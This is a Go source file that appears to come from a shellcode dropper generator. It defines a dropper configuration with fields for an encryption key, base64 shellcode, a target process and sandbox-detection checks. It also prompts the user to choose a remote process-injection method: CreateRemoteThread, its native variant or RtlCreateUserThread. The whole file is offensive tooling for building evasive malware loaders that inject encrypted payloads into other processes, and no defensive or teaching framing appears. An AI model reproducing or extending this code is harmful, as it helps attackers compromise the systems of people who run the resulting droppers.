package remote

import (
	"log"
	"strings"

	"github.com/kopp0ut/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateRemoteThread", "CreateRemoteThreadNative", "RtlCreateUserThread"}

type RemoteDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	RemoteProc string //Program Proc to Execute in
	Delay      int
	Dlls       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
	ProcAttach string
	Init       string
}

var FuncName = "SystemFunction_032"
var Export = "export"

func SelectRemote(selected string) (Dlls, Inject, Import, Extra string) {

	_, selected, _ = dropfmt.PromptList(Droppers, "Select the remote dropper you would like to use:")

	switch strings.ToLower(selected) {
	case "createremotethread":
		Dlls = CreateRemoteThreadDlls
		Inject = CreateRemoteThread
		Import = CreateRemoteThreadImports
	case "createremotethreadnative":
		Dlls = CreateRemoteThreadNativeDlls
		Inject = CreateRemoteThreadNative
		Import = CreateRemoteThreadNativeImports
	case "rtlcreateuserthread":
		Dlls = RtlCreateUserThreadDlls
		Inject = RtlCreateUserThread
		Import = RtlCreateUserThreadImports
	default:
		log.Fatalf("Error: Method '%s' not found.\nPlease use one of the following remote methods: %v\n", selected, Droppers)
	}

	return Dlls, Inject, Import, Extra
}
